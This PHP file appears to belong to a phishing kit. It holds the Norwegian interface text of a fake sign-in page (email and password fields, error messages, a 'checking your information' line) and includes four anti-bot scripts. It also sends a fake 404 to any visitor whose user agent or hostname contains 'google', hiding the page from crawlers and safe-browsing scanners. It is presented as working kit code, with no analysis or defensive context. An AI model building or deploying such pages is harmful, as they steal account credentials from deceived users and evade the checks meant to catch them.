<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
// signin
$ERROR = 'Kontroller informasjonen du har oppgitt og prøv på nytt.';
$Email ='E-post';
$Password ='Passord';
$dok ='Logg på';
$req1 = 'Det er påkrevd med en e-postadresse.';
$req2 = 'Passord er påkrevd.';
$forgot ='Har du problemer med å logge på?';
$sign = 'Opprett en konto';
$checking = 'Sjekker informasjonen din..';
$priva ='Personvern';
$ri8 = 'Med enerett';
$legal = '';
// end signin
?>